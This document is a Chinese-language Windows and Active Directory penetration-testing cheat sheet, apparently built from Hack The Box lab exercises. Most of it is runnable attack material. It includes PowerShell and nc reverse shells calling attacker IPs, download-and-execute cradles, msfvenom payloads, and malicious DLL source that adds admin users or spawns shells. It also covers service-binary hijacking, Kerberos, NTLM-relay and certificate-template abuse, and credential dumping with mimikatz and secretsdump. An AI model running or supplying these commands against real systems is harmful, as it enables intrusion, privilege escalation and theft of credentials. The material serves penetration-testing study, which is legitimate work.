
# Pen Testing Tips

- **查看 .lnk 文件指向的目标**
https://stackoverflow.com/questions/42762122/get-target-of-shortcut-lnk-file-with-powershell/42762873#42762873
```powershell
powershell -c "$sh = New-Object -ComObject WScript.Shell; $sh.CreateShortcut('.\FILE.lnk').TargetPath"
```

- **shell 语言限制绕过**
```powershell
$executioncontext.sessionstate.languagemode   (查看当前语言类型)
```
PSByPassCLM  -  https://github.com/padovah4ck/PSByPassCLM/tree/master   
拿到 Windwos VM 中 VS debug 调试，exe 文传输到靶机中，执行 ?
```powershell
nc -lvvp 2233

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.29 /rport=2233 /U c:\Users\amanda\Documents\PsBypassCLM.exe
```

- **AppLocker 限制绕过**
该 github 收集了绝大部分的 App Locker Bypass 的 Directory  , 可以尝试在里面执行二进制程序
https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md

- **PS Session 执行脚本报错 ： This script contains malicious content and has been blocked by your antivirus software.  (绕过)**
```
[+] 对于Evil-WinRM 的绕过方法
menu
Bypass-4MSI
```

- **枚举脚本**
https://github.com/PowerShellMafia/PowerSploit/tree/master
```powershell
~/tool/PowerSploit-master/Privesc/PowerUp.ps1
Invoke-AllChecks
(可疑服务 拥有可修改权限 滥用方式见下方 可修改服务二进制程序滥用)
```
**ADCS (易受攻击的证书模板) 枚举**
```bash
certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -text -stdout -vulnerable
```

- **DMP 文件 dump**
```bash
pypykatz lsa minidump lsass.DMP
```


# 横向移动

```powershell
$username = '';
$password = '';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <IP> -Credential $credential
Enter-PSSession 1
```


# 攻击向量

- ##### 特权组检查/提权 ：
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges

### 定时任务

清空脚本文件，然后追加写入命令,使用 ping 测试
```
cmd /c copy /y NUL clean.bat
cmd /c "echo ping 10.10.14.29 >> clean.bat"
```
反弹 shell 就用 nishang 的 Invoke-Powershell.ps1 (端口最好设置443，免得有防火墙限制出入站规则)
```
cmd /c "echo powershell iex(new-object net.webclient).downloadstring('http://10.10.14.29/rev.ps1') >> clean.bat"
```


### AlwaysInstallElevated set to 1
WinPeas 显示
```
AlwaysInstallElevated set to 1 in HKLM!
AlwaysInstallElevated set to 1 in HKCU!
```
PowerUp 显示
```
AbuseFunction : Write-UserADDMSI 
```
手动确认：
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
如果值都为0x1 , 则可以利用该点提权至 SYSTEM 

制作一个恶意 MSI 文件并从我们的反向 shell 执行它
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=1337 -a x64 --platform Windows -f msi -o evil.msi
```
上传到靶机后，建立监听，执行
`.\evil.msi`


### `SeBackupPrivilege` Group Privilege Escalation
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sebackupprivilege
- **0x01** sam2hash
```powershell
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

```bash
sudo sam2hash sam system
```

- **0x02**  wbadmin
```powershell
wbadmin start backup -quiet -backuptarget:\\dc01\c$\temp -include:c:\windows\ntds
```
`-quiet` ：在备份过程中禁止出现提示或消息
`-backuptarget` ：指定备份目标位置 : C 盘下的 temp 目录
`-include:` 指定备份的文件

```powershell
wbadmin get versions  (查看备份信息)
```

恢复备份:
```powershell
echo "Y" | wbadmin start recovery -version:02/12/2024-00:16 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\temp -notrestoreacl
```
`*Evil-WinRM* PS C:\temp> download ntds.dit` : Download File

Dump Hash
```bash
/usr/share/doc/python3-impacket/examples/secretsdump.py -ntds xxx -system xxx LOCAL
(ntds.dit And SYSTEM)
```



### `Server Operators` Group Privilege Escalation
允许以管理员的身份修改服务或配置，配合 `services` 查看正在运行的服务,然后修改二进制服务路径，类似于 linux 中的软链接。
先上传 nc64.exe
```powershell
sc.exe config [SERVICES] binPath="C:\Programdata\nc64.exe -e cmd.exe 10.10.14.21 2233"
```
然后 kali 监听，重启服务
```bash
sc.exe stop [SERVICES]
sc.exe start [SERVICES]
```


### 可修改服务二进制文件滥用
利用 Powerup.ps1 或者 Winpeas.exe 枚举到可修改，可疑文件的利用方式
[+] 确定 CanRestart 是否为 True (PowerUp.ps1)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=2233 -f exe -o rev.exe
```

```powershell
move C:\Program Files\MilleGPG5\GPGService.exe C:\programdata\GPGService.exe
move C:\programdata\rev.exe C:\Program Files\MilleGPG5\GPGService.exe
rlwrap nc -lvvp 2233
Restart-Service GPGOrchestrator
```


### Kerberos Relay Attack
https://github.com/cube0x0/KrbRelay
```bash
必须满足： 没有2022年10月补丁 ， 禁用LDAP签名 。
crackmapexec ldap absolute.htb -u m.lovegod -p 'AbsoluteLDAP2022!' -k -M ldap-checker   (检查ldap签名)
```

发现 OXID 解析器的可用端口
```
*Evil-WinRM* PS C:\programdata> .\CheckPort.exe 
[*] Looking for available ports..
[*] SYSTEM Is allowed through port 10
```

查找版本号
```
*Evil-WinRM* PS C:\programdata> cmd /c ver
Microsoft Windows [Version 10.0.17763.3406]
```
https://www.gaijin.at/en/infos/windows-version-numbers

**RunasCs** 是一个实用程序，用于使用与用户当前登录使用显式凭据提供的权限不同的权限来运行特定进程。该工具是 Windows 内置 runas.exe 的改进开放版本，解决了一些限制
https://github.com/antonioCoco/RunasCs/

从登录类型表里筛查，尝试 NewCredentials ，编号9
https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types
```bash
.\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb 'C:\Users\winrm_user\desktop\KrbRelayUp.exe full -m shadowcred --ForceShadowCred -cls 3c6859ce-230b-48a4-be6c-932c0c202048' -l 9
```

```powershell
./r.exe asktgt /user:DC$ /certificate:<certificate> /password:<passowrd> /getcredentials /show /nowrap
```

crackmapexec 转储 ntds
```powershell
crackmapexec smb absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds
```

### Net-NTLMv2 Relay Attack
假设我们获得了 Net-NTLMv2 哈希，但由于它太复杂而无法破解它 , 以尝试在**另一台机器**上使用哈希值，这就是所谓的中继攻击。
**举个例子就是通过 responder -I tun0 -A 获得的 NTLMhash 无法破解，即可用 hash 中继来获得 shell**
**rev.ps1**
https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.170',2233);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
修改代码后建立本地服务器并建立监听 `python -m http.server 80`

```powershell
python ~/tool/impacket-dacledit/examples/ntlmrelayx.py --no-http-server -smb2support -t 192.168.198.212 -c "powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.159/rev.ps1')\""
```

执行命令后得到 rev shell
```powershell
dir \\192.168.45.159\qwe
```

### lmcompatibilitylevel Level 0,1,2 
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level
验证 lmcompatibilitylevel 的值
```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel
```

```
sudo responder -I tun0 --lm  (kali)
```

修改 Challenge set :
- Responder.conf
![](photos/Pasted%20image%2020240208154422.png)

```
C:\"Program Files"\"windows defender"\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.9\share\file.txt
```

拿到 hash 后使用工具转换 hash 去破解
https://github.com/evilmog/ntlmv1-multi/tree/master


### Kerberos 基于资源的约束委派攻击

先决条件
```
Get-DomainObject -Identity '[Distinguishied Name]' | select ms-ds-machineaccountquota   (> 0 ?)
get-domaincontroller | select name,osversion | fl    (Version > Windows Server 2012 ?)
get-domaincomputer DC | select name,msds-allowedtoactonbehalfofotheridentity | fl   (变量为空 ?)
```

用到的脚本及软件，加载全部脚本
```
-a----          2/9/2024   9:21 PM         616938 Powermad.ps1
-a----          2/9/2024   9:21 PM         770279 PowerView.ps1
-a----         2/10/2024   1:02 AM         446976 Rubeus.exe
```

ATTACK

创建 FAKE 计算机 (Powermad)
```powershell
*Evil-WinRM* PS C:\Users\support\downloads> new-machineaccount -machineaccount fakecomputer -password $(ConvertTo-SecureString 'xek@123' -asplaintext -force)
[+] Machine account fakecomputer added
```

获取 FAKE 计算机 SID , 保存到变量中
```powershell
*Evil-WinRM* PS C:\Users\support\downloads> $fakesid = get-domaincomputer fakecomputer | select -expand objectsid
*Evil-WinRM* PS C:\Users\support\downloads> $fakesid
S-1-5-21-1677581083-3380853377-188903654-6101
```

配置信息达到欺骗
```powershell
*Evil-WinRM* PS C:\Users\support\downloads> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
*Evil-WinRM* PS C:\Users\support\downloads> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\downloads> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\Users\support\downloads> Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

验证
```powershell
*Evil-WinRM* PS C:\Users\support\downloads> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
*Evil-WinRM* PS C:\Users\support\downloads> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
*Evil-WinRM* PS C:\Users\support\downloads> $Descriptor.DiscretionaryAcl

BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-6101
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

使用 rubeus 获取 fakecomputer 的 hash (aes256_cts_hmac_sha1 , 主机名后要加$)
```powershell
*Evil-WinRM* PS C:\Users\support\downloads> .\Rubeus.exe hash /password:xek@123 /user:fakecomputer$ /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : xek@123
[*] Input username             : fakecomputer$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostfakecomputer.support.htb
[*]       rc4_hmac             : 3EF14F9550F524019996E9251C598D9A
[*]       aes128_cts_hmac_sha1 : 4BEA04F78AFA1D276D14372F604A8CC5
[*]       aes256_cts_hmac_sha1 : BF18C480A45562831DB95D35AA5FE0E0C57E5D7A12D71F6DAB0861386A4AD1C3
[*]       des_cbc_md5          : CE2FFDC8077C0846

```

获取 Ticket 票据
```bash
└─$ /usr/share/doc/python3-impacket/examples/getST.py support.htb/fakecomputer -dc-ip 10.129.230.181 -impersonate administrator -spn http/dc.support.htb -aesKey BF18C480A45562831DB95D35AA5FE0E0C57E5D7A12D71F6DAB0861386A4AD1C3
```

```bash
export KRB5CCNAME=administrator.ccache
```

- shell 
```bash
└─$ /usr/share/doc/python3-impacket/examples/smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```


### ADCS 易受攻击的模板滥用
枚举:
```bash
certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -text -stdout -vulnerable [-dc-ip]

PS C:\programdata> .\certify.exe find  （如果所在组拥有修改模板的所有扩展权限，）
```

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- **ES1 Attack**
**0x01** 
```bash
crackmapexec ldap 10.129.228.253 -u ryan.cooper -p NuclearMosquito3 -M adcs
-M adcs 指定了使用 Active Directory 证书服务模块

upload Certify.exe
.\Certify.exe find /vulnerable /currentuser   (枚举易受攻击的证书模板)
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator (利用此漏洞冒充管理员)
```
保存为 cret.pem 文件到 kali 中 
```bash
└─$ openssl pkcs12 -in cret.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 
Enter Export Password:   (密码设置为空)
Verifying - Enter Export Password:
```

```powershell
upload Rubeus.exe 
upload cert.pfx
.\Rubeus.exe asktgt /user:administrator /certificate:.\cert.pfx /getcredentials /show /nowrap
(传递伪造的证书以作为管理员获取TGT票据信息)
```
拿到 HTLM 的 HASH

**0x02 certipy-ad** (KALI)
```bash
certipy-ad find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
 
addcomputer.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name xek -computer-pass xekOnerR! -dc-ip 10.129.229.56 (创建计算机)

sudo ntpdate -u sequel.htb

certipy req -username 'xek$' -password 'xekOnerR!' -ca AUTHORITY-CA -dc-ip 10.129.229.56 -template CorpVPN -upn administrator@authority.htb

certipy auth -pfx administrator.pfx
```
拿到 HTLM 的 HASH
如果不行则尝试以下方法:
```bash
[mkdir tmp; cd tmp]
certipy cert -pfx administrator.pfx -nocert -out administrator.key
certipy cert -pfx administrator.pfx -nokey -out administrator.crt

python ~/tool/PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.229.56
# https://github.com/AlmondOffSec/PassTheCert

add_user_to_group <User> administrators
```

- **ESC7 Attack**
```bash
certipy-ad ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.73.38 -ns 10.129.73.38

其中 'manager-DC01-CA' 可以通过bloodhound查看

certipy-ad find -dc-ip 10.129.73.38 -ns 10.129.73.38 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout    (在ManageCa中可以看到已经存在了)
(certipy req -ca manager-DC01-CA -dc-ip 10.129.73.38 -u Raven -p 'R4v3nBe5tD3veloP3r!123' -template SubCA -target dc01.manager.htb -upn raven@manager.htb)

certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.73.38 -ns 10.129.73.38  (可能不会保存成功)

certipy ca -ca manager-DC01-CA -issue-request 23 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.73.38 -ns 10.129.73.38
(如果保存不成功重新执行第一条添加命令)

certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 23 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.73.38 -ns 10.129.73.38   （检索颁发的证书）

sudo ntpdate IP/domain

certipy auth -pfx ./administrator.pfx -dc-ip 10.129.73.38 -ns 10.129.73.38  (获取hash)
```


### Responder 相关

 **0x01 Web-Request 自动任务 - 靶机新增 DNS 记录绑定 kali **
- 自动任务，使用身份凭证链接到靶机 DNS ，新增一套 web（自动任务关键词） 开头的 DNS 绑定到 kali
```bash
└─$ python3 DNSUpdate.py -DNS 10.129.228.41 -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a ad -r web-xekOnerR -d 10.10.14.16                                                             
```
- Responder
```bash
└─$ sudo responder -I tun0
```

**0x02 powershell 链接 kali 拿 hash**
```bash
sudo responder -I tun0   (kali)
\\10.10.14.16\QWE   (Windows)
```

**0x03 smb 服务可写文件  (文件可以被写入进文件共享服务)**
Windows 资源管理器 Shell 命令文件 ( `.scf` ) 让 Windows 在用户访问包含该文件的目录时打开 SMB 连接
`.scf` 是一个文本文件，可以包含远程图标路径; 
```scf
[Shell]
Command=2

IconFile=\\10.10.14.29\icon
```
上传后，kali 设置 Responder

**0x04 smb 可写文件**
写入 .lnk 文件来获得 Hash
https://github.com/xct/hashgrab
```bash
python ~/tools/hashgrab/hashgrab.py 192.168.45.170 this
smb: \Documents\> put this.lnk
sudo responder -I tun0 -A
```



- ### WSUS  EXP   ( `WSUS Administrators`  Group  Privilege Escalation )
```bash
.\SharpWSUS.exe inspect  (Enumeration)
.\SharpWSUS.exe locate   (Enumeration)

用到 nc64.exe  sharpwsus.exe  psexec64.exe

.\sharpwsus.exe create /payload:"C:\Users\sflowers\desktop\psexec64.exe" /args:" -accepteula -s -d C:\Users\sflowers\desktop\nc64.exe -e cmd.exe 10.10.14.43 1337" /title:"EXP"

nc -lvvp 2233

.\SharpWSUS.exe approve /updateid:7dd7bd2a-3282-4573-b7fc-c26a9be64633 /computername:dc.outdated.htb /groupname:"xekOnerR"    (updateid根据上一条命令输出修改 , 运行后等待差不多两分钟就可以收到shell)
```


- ### Silver Ticket Attack
如果拥有一个运行服务的凭据，比如说 SQL 的凭据 
那就可能可以伪造 TGS(票证授予服务) 票证，直接在客户与服务中使用，不经过 dc
```
iconv -f ASCII -t UTF-16LE <(printf "Password") | openssl dgst -md4   (生成NTLM Hash)
python /usr/share/doc/python3-impacket/examples/getPac.py -targetUser administrator scrm.local/ksimpson:ksimpson   (获取域SID Domain SID)
(查询SPN见下)
```

```
python /usr/share/doc/python3-impacket/examples/ticketer.py -spn MSSQLSvc/dc1.scrm.local:1433 -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local administrator

KRB5CCNAME=administrator.ccache  脚本后跟-k 
例: 
KRB5CCNAME=administrator.ccache python /usr/share/doc/python3-impacket/examples/mssqlclient.py -k dc1.scrm.local
```


 - ### 通过机器帐户请求服务票证
https://0xdf.gitlab.io/2021/11/08/htb-pivotapi-more.html#dcsync
与银票攻击类似，在域内得到了一个虚拟账户的 shell, 例如 `iis apppool\defaultapppool`; 或者是 sql server 的用户
```python
# 由于作为 MSSQL 的服务账户运行，可以通过网络以该账户的身份向 DC 进行身份验证，它将是运行 MSSQL 的计算机账户，也就是 DC。DC 的计算机帐户有权进行 DC 同步攻击
```
如果使用 responder 可以获得其 hash, 就可以通过 dcsync， 获取域内所有的用户凭据

```bash
.\Rubeus.exe tgtdeleg /nowrap         #获取帐户的虚假委托票证
python3 /usr/lib/python3/dist-packages/minikerberos/examples/kirbi2ccache.py ticket.kirbi ticket.ccache     # 解码 base64 票据并将其另存, 转换为ccache

export KRB5CCNAME=ticket.ccache
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -no-pass g0.flight.htb -k [-just-dc-user administrator]
```


### `SeImpersonatePrivilege` ，(`SeAssignPrimaryToken`)  权限 : 利用 Juice Potato 本地提权
[+] JuicyPotato doesn't work on _Windows Server 2019_ and _Windows 10 build 1809_
**Windows Server 2019 可以使用 rogue potato**
https://github.com/antonioCoco/JuicyPotatoNG   
**mssql xm_cmdshell ：**
re.bat : `C:\programdata\nc64.exe -e cmd 10.10.14.32 1433`
```
enable xp_cmdshell
xp_cmdshell "powershell curl http://10.10.14.32:8888/nc64.exe -OutFile C:\programdata\nc64.exe"
xp_cmdshell "powershell curl http://10.10.14.32:8888/JuicyPotatoNG.exe -OutFile C:\programdata\jp.exe"
xp_cmdshell "powershell curl http://10.10.14.32:8888/re.bat -OutFile C:\programdata\re.bat"

nc -lvvp 1433 (kali本地监听)

xp_cmdshell "C:\programdata\jp.exe -t * -p C:\programdata\re.bat"  (得到reverse shell)
```

**Windows :**
先写一个 reverse.bat
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.50',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
如果 JuicyPotatoNG  不能提权的话就尝试 JuicyPotato
https://github.com/ohpe/juicy-potato
https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2
```
.\jp.exe -l 1337 -p 'C:\programdata\reverse.bat' -t *

JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"

.\JuicyPotato_x86.exe -l 5555 -p C:\programdata\rev.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
```

**Windows 10 , Server 2016/2019可以使用 PrintSpoofer**
https://github.com/itm4n/PrintSpoofer
```powershell
PS C:\programdata> .\p.exe -c 'C:\programdata\n.exe -e cmd 192.168.45.171 1337'
```

**Windows10 Pro , Windows Server 2012 - Windows Server 2022 , Windows8 - Windows 11 可以使用 GodPotato** 
https://github.com/BeichenDream/GodPotato
```powershell
.\god.exe -cmd "cmd /c whoami"
```
GodPotato-NET2.exe  GodPotato-NET35.exe  GodPotato-NET4.exe 都可以尝试

### 滥用 AD 证书服务
参考 [0x31 Sizzle  (CA证书服务滥用,smb Responder)](../0x0B%20HackTheBox%20WP/靶机推荐第五组%2081-120暨内⽹和域渗透学习路径/0x31%20Sizzle%20%20(CA证书服务滥用,smb%20Responder).md)
- 生成一个具有 AES-256加密的2048位 RSA 私钥
```bash
openssl genrsa -aes256 -out amanda.key 2048
```

- 生成证书签名请求
```bash
	openssl req -new -key amanda.key -out amanda.csr
```

**请求证书**
![](photos/Pasted%20image%2020240309205658.png)
![](photos/Pasted%20image%2020240309205714.png)
![](photos/Pasted%20image%2020240309205737.png)
https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb
```ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'https://10.129.96.90:5986/wsman',
  transport: :ssl,
  client_cert: 'amanda.cer',  
  client_key: 'amanda.key',   
  key_pass: '123456',         
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end
```

![](photos/Pasted%20image%2020240309210753.png)


### 有登录的会话偷窃 hash
查询当前 Windows 系统上的所有用户会话
```cmd
qwinsta *
```
不能运行，可以尝试 RunasCs.exe
```powershell
.\Run.exe x x qwinsta -l 9
```

**0x01 RemotePotato0 v 1.2**
https://github.com/antonioCoco/RemotePotato0
本地建立监听，转发回靶机9999端口
```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.57.132:9999
```
偷取 hash
```powershell
.\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.50 -p 9999
```

**0x02 KrbRelay**
https://github.com/cube0x0/KrbRelay/tree/main
```bash
.\Run.exe x x -l 9 "C:\programdata\KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm"
```


### DLL 劫持相关（总结）
- 一般都和一个自动执行任务的程序在一起，比如说 .au3 (AutoIt 脚本文件, 自动化 Windows 图形用户界面 (GUI) 的脚本语言)
- 获得 rdp 后使用 process Monitor ，重启服务并监视，找到缺失的 dll 并滥用。
创建一个 dll 上传，来确定 dll 会不会/什么时候会被调用  ; 先创建一个我们自己定义的 c 语言
```c
└─$ cat test.c  
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason , LPVOID lpReserved)
{
    switch(dwReason)
    {
        case DLL_PROCESS_ATTACH:
            system("cmd.exe /c ping 10.10.14.29");
            break;
    }
    return TRUE;
}
```

构建为 dll 文件替换
```bash
x86_64-w64-mingw32-gcc test.c -shared -o test.dll
```

继续构建 （例子，是修改自己的权限，然后覆盖文件为 nc，反弹 rev shell）
```c                                                                             
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason , LPVOID lpReserved)
{
    switch(dwReason)
    {
        case DLL_PROCESS_ATTACH:
            system("cmd.exe /c takeown /F C:\\share\\Bginfo64.exe");
            system("cmd.exe /c cacls C:\\share\\Bginfo64.exe /E /G ginawild:F");
            system("cmd.exe /c copy C:\\programdata\\nc64.exe C:\\share\\Bginfo64.exe");
            system("cmd.exe /c C:\\share\\Bginfo64.exe -e cmd 10.10.14.29 9001");
            break;
    }
    return TRUE;
}
```
`takeown`  /F 指定修改某个文件的所有权为自己
`cacls `  修改文件的标准访问控制列表，/E 表示修改不是替换， /G 表示修改特定的 ACL
- reverse shell
```bash
rlwrap -cAr nc -lvvnp 9001
```

**其他(微软)C++ 示例代码**
```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

编译 DLL
```bash
x86_64-w64-mingw32-gcc dll.cpp --shared -o myDLL.dll
```


### `AD Recycle Bin` Group
此组中的成员身份允许读取已删除的 Active Directory 对象，这可能会泄露敏感信息：
```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```


### `SeDebugPrivilege` Group
[Windows 后利用](Windows%20后利用.md)
- mimikatz.exe
https://github.com/ParrotSec/mimikatz
```bash
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit  (需要高权限)
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets" exit
```
- **lsassy** 
https://github.com/login-securite/lsassy
```bash
lsassy -d MS01.oscp.exam -u administrator -p December31 192.168.244.153
```


### `SeMachineAccountPrivilege` Privilege Abuse
Download File: 
https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9--------------------------------
执行后即可写入 C 盘。
```powershell
C:\>echo 'Test!' > test.txt
07/01/2024  02:04 AM                10 test.txt
```

PrivEsc 方式：
https://github.com/xct/SeManageVolumeAbuse
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.170 LPORT=1337 -f dll -o tzres.dll
copy C:\programdata\tzres.dll C:\Windows\System32\wbem\tzres.dll
rlwrap nc -lvvnp 1337 
systeminfo
```
就是管理员权限了


### `cmdkey /list` 显示缓存凭据
```
C:\Users\security>cmdkey /list 

Currently stored credentials: 

Target: Domain:interactive=ACCESS\Administrator 
Type: Domain Password 
User: ACCESS\Administrator
```

修改 nishang 的 `Invoke-PowerShellTcp.ps1`
```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 2233
```

```bash
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.16.21/shell.ps1')"
```

反弹 shell


### `DnsAdmins` Group PrivEsc
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.21 LPORT=2233 -f dll -o rev.dll
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
rlwrap nc -lvvnp 2233
```

```powershell
dnscmd.exe /config /serverlevelplugindll \\10.10.16.21\share\rev.dll
sc.exe \\resolute stop dns
sc.exe \\resolute start dns
```